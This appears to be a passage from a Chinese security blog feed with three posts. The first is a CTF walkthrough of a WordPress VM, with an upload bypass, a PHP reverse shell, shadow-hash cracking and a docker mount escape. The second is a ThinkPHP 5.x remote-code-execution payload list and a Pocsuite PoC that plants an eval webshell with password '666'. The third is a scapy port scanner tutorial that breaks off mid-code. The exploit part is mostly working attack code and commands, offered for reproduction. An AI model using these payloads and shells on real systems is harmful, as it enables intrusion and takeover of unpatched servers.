    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul><li>难度定位是初级</li><li>CTF风格</li><li>作者: Fatih Çelik</li></ul><h2 id="0x02-Nmap一把梭"><a href="#0x02-Nmap一把梭" class="headerlink" title="0x02 Nmap一把梭"></a>0x02 Nmap一把梭</h2><a id="more"></a><p><img src="nmap.png" alt=""></p><blockquote><p> 获得信息</p><ul><li>开放端口 20 22 514 8000 </li><li>apache 2.4.25</li><li>WordPress 5.0.3</li><li>robots.txt ban了<code>/upload.php</code>和<code>/uploads</code></li></ul></blockquote><h2 id="0x03-WPScan一把梭"><a href="#0x03-WPScan一把梭" class="headerlink" title="0x03 WPScan一把梭"></a>0x03 WPScan一把梭</h2><p>有wp的话，先访问8000看看<br><img src="wordpress.png" alt=""></p><p>emmm….应该是localhost的问题，先不管了</p><p>既然是wordpress先上wpscan扫一波吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.101:8000</span><br></pre></td></tr></table></figure><p>但是</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir</span><br></pre></td></tr></table></figure><p>搜了下，类似的问题很少，几乎没有…</p><p>最后在github上找到个上古年代的反馈<br><img src="redirect.png" alt=""></p><p>说可能是重定向的问题，但我在响应头里没找到任何重定向？</p><p>这难道是靶机作者挖的坑?</p><p> 那就指明一下wp-content的目录吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content</span><br></pre></td></tr></table></figure><blockquote><ul><li>php 7.2.15</li><li>xmlrpc.php</li><li>wp-cron.php</li></ul></blockquote><p>扫出有一枚XSS漏洞，但这有啥用?摔(′д｀ )…彡…彡</p><p>让我打谁cookie去?emmmm，陷入沉思</p><p>枚举一下主题漏洞和插件漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vt</span><br><span class="line">[i] No themes Found.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vp</span><br><span class="line">[i] No plugins Found.</span><br></pre></td></tr></table></figure><p>凉凉</p><p>灵机一动看到有<code>xmlrpc.php</code></p><p>拿出msf爆破一发</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.56.101</span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line"><span class="built_in">set</span> threads 200</span><br><span class="line"><span class="built_in">set</span> USER_FILE <span class="string">'/root/top10.txt'</span></span><br><span class="line"><span class="built_in">set</span> PASS_FILE <span class="string">'/root/top10.txt'</span></span><br><span class="line"><span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="0x04-略艰难的Getshell之路"><a href="#0x04-略艰难的Getshell之路" class="headerlink" title="0x04 略艰难的Getshell之路"></a>0x04 略艰难的Getshell之路</h2><p>好的，趁爆破时间逛一下robots ban的页面<br><img src="upload.png" alt=""></p><p>我……….</p><p>我都在折腾个啥</p><p>上个图片试试<br><img src="upload-failed.png" alt=""></p><p>这算成功了?</p><p>访问一下不存在…改名了还是???<br><img src="hint.png" alt=""></p><p>hint来了</p><p>好的又被坑了一下，这才是正确url</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/fatihhcelik/Vulnerable-Machine---Hint</span><br></pre></td></tr></table></figure><blockquote><p>upload.php源码get</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$uploadOk = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是<strong>getimagesize</strong>先做个马<code>cat a.png a.php &gt; b.php</code></p><p>上传成功了</p><p>emmm写个脚本吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    t = <span class="string">'b.php'</span>+str(i)</span><br><span class="line">    hash = hashlib.md5(t.encode())</span><br><span class="line">    url = <span class="string">'http://192.168.56.101:8000/uploads/'</span>+hash.hexdigest()+<span class="string">'.php'</span></span><br><span class="line">    rs = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> rs.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> url</span><br></pre></td></tr></table></figure><p>反复多次测试,没有??怎么可能，翻了好多资料，翻了好多国外的wp，思路没问题</p><p>只是多数是写成字典进行爆破的</p><p>但是就是没这个文件</p><p>直到<br><img src="waf.png" alt=""></p><p>我发现这个上一秒还在,下一秒就消失的文件</p><p>真相只有一个，这站有…….有’狗’</p><p>事后我找了许多paper都是可以直接上传的，包括一句话，那么问题来了，我的马呢?</p><p>前后试过msf的php反弹和普通的php反弹，一句话，加密一句话，但并没有用<br><img src="msf.png" alt=""></p><p>msf的表现最糟糕，不知道是什么原因，根本没有权限，连目录浏览权限都没有…….</p><p>最后找了个php弹shell的方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.56.102'</span>, <span class="number">4444</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cat也懒得cat了，直接加个<code>GIF89a</code>也一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><h2 id="0x05-PWN"><a href="#0x05-PWN" class="headerlink" title="0x05 PWN!!!!!"></a>0x05 PWN!!!!!</h2><p>总算拿到shell了,可以肯定是有某种检测机制的，只要我写文件就直接断连，并且马儿被删，我可怜的马儿</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找suid</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查看root密码</span></span><br><span class="line">tail -c1G /etc/shadow</span><br><span class="line"></span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$qoj6</span>/JJi<span class="variable">$FQe</span>/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br></pre></td></tr></table></figure><p>密文拿到手,保存为rules.txt，那john跑一下密码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=pass.lst --rules rules.txt</span><br></pre></td></tr></table></figure><p>跑出来是<code>john</code>,醉了</p><p>尝试sudo但<code>command not found</code>，su报错<code>su: must be run from a terminal</code></p><p>还好有py环境</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"import pty; pty.spawn('/bin/bash')"</span> &gt; /tmp/asdf.py</span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure><p><img src="pwn.png" alt=""></p><p>( •̀ ω •́ )y</p><p><img src="ps.png" alt=""></p><p>但是进程少到不对劲，最起码的数据库的进程也没有<br><img src="database.png" alt=""></p><p>ping了下db是<code>172.18.0.3</code>，嗯?</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 172.18.0.3 -uwordpress -pwordpress</span><br></pre></td></tr></table></figure><p>连上去翻了一下<br><img src="mysql.png" alt=""></p><p>ssh_cred，见名知义</p><p>上cmd5查了一下是123456………</p><p>ssh上去</p><p>原来是docker，我说怎么进程这么干净不像ubuntu</p><p><img src="docker.png" alt=""></p><h2 id="0x06-GetFlag"><a href="#0x06-GetFlag" class="headerlink" title="0x06 GetFlag"></a>0x06 GetFlag</h2><p>我以为这就完了</p><p>结果说要找到flag才行…..</p><p>mysql和wordpress都明确的目的</p><p>那么就是ubuntu这个镜像了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v /:/ameer -i -t ubuntu /bin/bash</span><br><span class="line">在/ameer/root有个flag</span><br></pre></td></tr></table></figure><p><img src="flag.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;难度定位是初级&lt;/li&gt;
&lt;li&gt;CTF风格&lt;/li&gt;
&lt;li&gt;作者: Fatih Çelik&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x02-Nmap一把梭&quot;&gt;&lt;a href=&quot;#0x02-Nmap一把梭&quot; class=&quot;headerlink&quot; title=&quot;0x02 Nmap一把梭&quot;&gt;&lt;/a&gt;0x02 Nmap一把梭&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用</title>
    <link href="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/"/>
    <id>https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/</id>
    <published>2019-01-11T22:58:00.000Z</published>
    <updated>2019-02-13T05:10:44.078Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>半醉半醒日复日,花落花开年复年。</p></blockquote><p>2019了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><a id="more"></a><p>漏洞分析有很多大佬巨佬做过了，我就不献丑了emmmm<br>给大家找了一篇分析paper，建议去研究研究</p><p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">水泡泡</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><ul><li>漏洞影响:Thinkphp 5.0.23及5.1.31以下(即12月9日安全更新前所有版本)</li><li><img src="thinphp-5.x-release.JPG" alt=""></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">vulnspy的漏洞源码</a></li><li><a href="http://www.thinkphp.cn/down/p/1.html" target="_blank" rel="noopener">官方漏洞源码</a></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">官方github源码</a></li><li><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">Thinkphp v5.0.x补丁</a></li><li><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">Thinkphp v5.1.x补丁</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-97767" target="_blank" rel="noopener">seebug</a></li></ul><p>注意:官网只有5.0.x的版本，测试5.1.x需要到github自己clone一个再用composer安装或者用vulnspy的</p><ul><li><a href="http://www.thinkphp.cn/topic/52362.html" target="_blank" rel="noopener">composer</a></li></ul><h2 id="全平台共有具有漏洞的类"><a href="#全平台共有具有漏洞的类" class="headerlink" title="全平台共有具有漏洞的类"></a>全平台共有具有漏洞的类</h2><p>可以继续挖掘更多payload，我就不(tai)来(cai)了(le)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Loader</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Env</span><br><span class="line">think\Config</span><br><span class="line">think\Hook</span><br><span class="line">think\Lang</span><br><span class="line">think\Request</span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure><h2 id="编写前准备"><a href="#编写前准备" class="headerlink" title="编写前准备"></a>编写前准备</h2><p>对于网上的payload进行了收集,本打算基于以下四个payload进行Poc的编写</p><h3 id="Request-input"><a href="#Request-input" class="headerlink" title="Request/input"></a>Request/input</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php</span><br></pre></td></tr></table></figure><h3 id="Request-cache"><a href="#Request-cache" class="headerlink" title="Request/cache"></a>Request/cache</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\request/cache&amp;key=1|phpinfo</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=dir|system</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=<span class="built_in">echo</span>%20%22&lt;?php%20eval(<span class="variable">$_POST</span>[cmd])?&gt;%22%20&gt;%20a.php|system</span><br></pre></td></tr></table></figure><h3 id="container-invokefunction"><a href="#container-invokefunction" class="headerlink" title="container/invokefunction"></a>container/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><h3 id="app-invokefunction"><a href="#app-invokefunction" class="headerlink" title="app/invokefunction"></a>app/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span>%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.php</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><p>还有一个貌似只能写文件的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval(<span class="variable">$_POST</span>[123]);?%3C</span><br></pre></td></tr></table></figure><h2 id="Payload测试"><a href="#Payload测试" class="headerlink" title="Payload测试"></a>Payload测试</h2><p>测试的时候发现了些问题</p><p><img src="thinkphp-5.x-test.JPG" alt=""></p><p>前三个paylaod对于5.0.x无效，只有第四个有效</p><p>而5.1.x则通杀</p><p>结合水泡泡的分析</p><p><img src="thinkphp-5.x-shuipaopao.JPG" alt=""></p><p>那就只有app/invokefunction一条路可以走了</p><h2 id="Poc的编写"><a href="#Poc的编写" class="headerlink" title="Poc的编写"></a>Poc的编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThinkphpPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'97767'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'p1n3'</span>]</span><br><span class="line">    vulDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    createDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    updateDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    references = [<span class="string">'https://www.seebug.org/vuldb/ssvid-97767'</span>]</span><br><span class="line">    name = <span class="string">'Thinkphp 5.0.23及5.1.31以下 远程代码执行'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.thinkphp.cn/'</span></span><br><span class="line">    appName = <span class="string">'Thinkphp'</span></span><br><span class="line">    appVersion = <span class="string">'5.x'</span></span><br><span class="line">    vulType = <span class="string">'RCE'</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下</span></span><br><span class="line"><span class="string">    可能的远程代码执行导致getshell，受影响包括Thinkphp全版本，建议更新到最新版或开启强制路由</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payload = self.url + <span class="string">'/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                             <span class="string">'&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53'</span></span><br><span class="line">        response = req.get(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># md5(666) 的值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fae0b27c451c728867a567e8c1bb4e53'</span> <span class="keyword">in</span> str(response.content):</span><br><span class="line">            result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>] = payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        info = &#123;</span><br><span class="line">            <span class="string">'ResultCode'</span>: &#123;</span><br><span class="line">                <span class="string">'a'</span>: <span class="keyword">False</span>,</span><br><span class="line">                <span class="string">'b'</span>: <span class="keyword">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        payload1 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E'</span></span><br><span class="line">        payload2 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php'</span></span><br><span class="line">        req.get(payload1)</span><br><span class="line">        <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] = <span class="keyword">True</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            req.get(payload2)</span><br><span class="line">            <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">                result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">                info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>] = <span class="keyword">True</span></span><br><span class="line">                result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] <span class="keyword">or</span> info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>]:</span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'shell'</span>] = self.url+<span class="string">'/info.php'</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'pass'</span>] = <span class="string">'666'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'The vulnerability does not appear to be available!'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(ThinkphpPoC)</span><br></pre></td></tr></table></figure><h2 id="Poc测试"><a href="#Poc测试" class="headerlink" title="Poc测试"></a>Poc测试</h2><p><img src="thinkphp-5.x-pocsuite.JPG" alt=""></p><p>还是第一次用Pocsuite，写的不好…你来打我呀</p><p>相比pentestDB等，Pocsuite体验非常不错，打算以后就一直使用Pocsuite好了(如果有更好的框架请务必私信我)</p><p>verify模式忘截图了</p><p>attack模式会直接在同目录下写一句话木马</p><p>祭出法器中国蚁剑</p><p><img src="thinkphp-5.x-yijian2.JPG" alt=""></p><p>文件是info.php 密码666</p><p>很好</p><h2 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it"></a>enjoy it</h2><p><img src="thinkphp-5.x-yijian.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;半醉半醒日复日,花落花开年复年。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2019了。&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://0xp1n3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="thinkphp" scheme="https://0xp1n3.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>python打造基于scapy的扫描器</title>
    <link href="https://0xp1n3.github.io/2018/11/17/web-scan/"/>
    <id>https://0xp1n3.github.io/2018/11/17/web-scan/</id>
    <published>2018-11-17T12:14:38.000Z</published>
    <updated>2019-03-18T12:26:51.785Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备事宜"><a href="#准备事宜" class="headerlink" title="准备事宜"></a>准备事宜</h2><p>scapy库<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secdev/scapy.git</span><br><span class="line"><span class="built_in">cd</span> ./scapy</span><br><span class="line">python setup.py</span><br></pre></td></tr></table></figure></p><h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><a id="more"></a><p>放个三次握手原理图<br><img src="web-scan-1.png" alt=""><br>与被扫描机进行SYN握手，有回应就是开放了端口<br>基本思路参考</p><ul><li><a href="https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy" target="_blank" rel="noopener">scapy官方文档</a></li><li><a href="https://www.freebuf.com/sectool/94507.html" target="_blank" rel="noopener">如何用Scapy写一个端口扫描器？</a></li><li><a href="https://www.freebuf.com/sectool/125491.html" target="_blank" rel="noopener">Python的无状态SYN快速扫描 </a></li></ul><p>完整的项目我放到了github上</p><ul><li><a href="https://github.com/sherdh/pineScan" target="_blank" rel="noopener">这里</a></li></ul><h2 id="预定义的全局变量"><a href="#预定义的全局变量" class="headerlink" title="预定义的全局变量"></a>预定义的全局变量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目标ip与端口</span></span><br><span class="line">ports = <span class="string">''</span></span><br><span class="line">target = <span class="string">''</span></span><br><span class="line"><span class="comment">#定义是否用socket扫描，默认用syn</span></span><br><span class="line">socket_scan_mode = <span class="keyword">False</span></span><br><span class="line"><span class="comment">#合计socket扫到端口</span></span><br><span class="line">socket_flag = <span class="number">0</span></span><br><span class="line"><span class="comment"># Pn = True</span></span><br><span class="line"><span class="comment"># socket扫描多线程锁</span></span><br><span class="line">lock = threading.Semaphore(value=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#默认扫描的端口</span></span><br><span class="line">default_ports = [...]</span><br><span class="line"><span class="comment">#端口可能对应的服务</span></span><br><span class="line">port_list = &#123;...&#125;</span><br></pre></td></tr></table></figure><h2 id="getopt模块处理用户输入"><a href="#getopt模块处理用户输入" class="headerlink" title="getopt模块处理用户输入"></a>getopt模块处理用户输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#用法提示</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: pineScan.py -t target_host (-p)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -h --help"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -t --target"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -t 127.0.0.1"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -p --port"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -p 80,445"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -s --socket"</span></span><br><span class="line"><span class="comment">#print " -Pn --skip host discovery"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ports</span><br><span class="line"><span class="keyword">global</span> target</span><br><span class="line"><span class="keyword">global</span> socket_scan_mode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#对用户输入的参数解析</span></span><br><span class="line">opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hp:t:s"</span>,[<span class="string">"help"</span>,<span class="string">"port"</span>,<span class="string">"target"</span>,<span class="string">"socket"</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line"><span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>,<span class="string">"--target"</span>):</span><br><span class="line">target = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>,<span class="string">"--port"</span>):</span><br><span class="line">ports = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-s"</span>,<span class="string">"--socket"</span>):</span><br><span class="line">socket_scan_mode = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span 